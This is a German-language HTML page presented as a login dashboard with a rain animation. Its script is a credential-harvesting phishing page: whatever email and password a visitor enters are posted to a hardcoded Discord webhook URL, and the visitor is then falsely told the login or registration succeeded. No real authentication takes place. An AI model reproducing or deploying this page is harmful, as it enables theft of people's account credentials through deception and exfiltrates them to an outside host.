<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121016;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        .rain {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            pointer-events: none;
            z-index: -1;
        }
        .container {
            background-color: #1e1b2e;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
            width: 400px;
            text-align: center;
            transition: all 0.5s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .input-field {
            width: calc(100% - 20px);
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            text-align: center;
            background-color: #2a2a3a;
            color: white;
        }
        .btn {
            width: calc(100% - 20px);
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border: none;
            font-size: 16px;
            background-color: #7289da;
            color: white;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #5a6ebc;
        }
    </style>
</head>
<body>
    <canvas class="rain" id="rainCanvas"></canvas>
    <div class="container" id="login-container">
        <h2 id="form-title">Login</h2>
        <input type="email" id="email" class="input-field" placeholder="Email">
        <input type="password" id="password" class="input-field" placeholder="Passwort">
        <button class="btn" onclick="loginUser()">Login</button>
        <button class="btn" onclick="registerUser()">Account erstellen</button>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1349850414543142912/6ujUtioGiTKVrXMrs-dQbB83Ss5799TzqwczsAdxyeroOXcvaX-ALTRetR25_RywY-D5";
        
        function sendWebhook(message) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            });
        }

        function loginUser() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            
            if (email && password) {
                sendWebhook(`üîê **Login-Versuch**\nüìß **E-Mail:** ${email}\nüîë **Passwort:** ${password}`);
                alert("Login erfolgreich!");
            } else {
                alert("Bitte f√ºlle alle Felder aus.");
            }
        }

        function registerUser() {
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            
            if (email && password) {
                sendWebhook(`üìù **Neue Registrierung**\nüìß **E-Mail:** ${email}\nüîë **Passwort:** ${password}`);
                alert("Registrierung erfolgreich! Bitte logge dich ein.");
            } else {
                alert("Bitte f√ºlle alle Felder aus.");
            }
        }

        function createSmoothRain() {
            const canvas = document.getElementById("rainCanvas");
            const ctx = canvas.getContext("2d");
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            let drops = [];
            for (let i = 0; i < 200; i++) {
                drops.push({
                    x: Math.random() * canvas.width,
                    y: Math.random() * canvas.height,
                    speed: Math.random() * 3 + 1,
                    length: Math.random() * 20 + 10,
                    opacity: Math.random() * 0.5 + 0.2
                });
            }

            function drawRain() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.strokeStyle = "rgba(173, 216, 230, 0.6)";
                ctx.lineWidth = 1;
                ctx.lineCap = "round";

                drops.forEach(drop => {
                    ctx.globalAlpha = drop.opacity;
                    ctx.beginPath();
                    ctx.moveTo(drop.x, drop.y);
                    ctx.lineTo(drop.x, drop.y + drop.length);
                    ctx.stroke();
                });
                ctx.globalAlpha = 1;
            }

            function animateRain() {
                drops.forEach(drop => {
                    drop.y += drop.speed;
                    if (drop.y > canvas.height) {
                        drop.y = -drop.length;
                        drop.x = Math.random() * canvas.width;
                    }
                });
                drawRain();
                requestAnimationFrame(animateRain);
            }

            animateRain();
        }

        createSmoothRain();
    </script>
</body>
</html>
